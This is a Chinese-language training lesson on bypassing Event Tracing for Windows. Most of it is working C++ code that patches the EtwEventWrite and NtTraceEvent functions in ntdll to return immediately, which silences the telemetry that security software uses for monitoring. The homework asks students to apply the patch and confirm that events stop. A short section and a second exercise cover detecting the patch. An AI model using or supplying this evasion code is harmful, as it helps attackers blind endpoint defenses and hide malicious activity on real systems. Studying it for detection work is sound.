# 课时34：ETW绕过

## 1. 课程目标

深入学习ETW (Event Tracing for Windows) 绕过技术。

---

## 2. ETW简介

ETW是Windows的事件跟踪机制，安全软件用它来监控：
- 进程创建/终止
- 线程创建
- 模块加载
- 网络活动
- 等等

---

## 3. ETW绕过方法

### 3.1 Patch EtwEventWrite

```cpp
#include <windows.h>

BOOL DisableETW() {
    // 获取EtwEventWrite地址
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    LPVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    if (!pEtwEventWrite) return FALSE;
    
    // Patch为直接返回
    // x64: xor eax, eax; ret
    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}
```

### 3.2 Patch NtTraceEvent

```cpp
BOOL DisableNtTraceEvent() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    LPVOID pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
    
    if (!pNtTraceEvent) return FALSE;
    
    // 返回STATUS_SUCCESS (0)
    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(pNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pNtTraceEvent, patch, sizeof(patch));
    VirtualProtect(pNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}
```

### 3.3 禁用Provider

```cpp
// 通过修改Provider GUID使其无效
BOOL DisableProvider(LPCGUID pProviderGuid) {
    // 找到Provider注册结构
    // 修改EnableCallback或设置EnableLevel=0
    // 需要内核或特殊权限
    return FALSE;  // 需要进一步实现
}
```

---

## 4. 检测ETW状态

```cpp
#include <windows.h>
#include <evntrace.h>

void CheckETWStatus() {
    // 检查EtwEventWrite是否被patch
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    LPBYTE pEtw = (LPBYTE)GetProcAddress(hNtdll, "EtwEventWrite");
    
    // 正常的函数开头应该是: mov r11, rsp (4C 8B DC)
    if (pEtw[0] == 0x48 && pEtw[1] == 0x33 && pEtw[2] == 0xC0) {
        printf("[!] EtwEventWrite已被patch\n");
    } else {
        printf("[+] EtwEventWrite正常\n");
    }
}
```

---

## 5. 课后作业

### 作业1：ETW Patch（必做）

1. 实现EtwEventWrite的patch
2. 验证ETW事件不再产生

### 作业2：恢复检测（进阶）

1. 编写检测ETW是否被patch的工具
2. 研究安全软件的ETW保护机制

---

## 6. 下一课预告

下一课我们将学习APC注入技术。
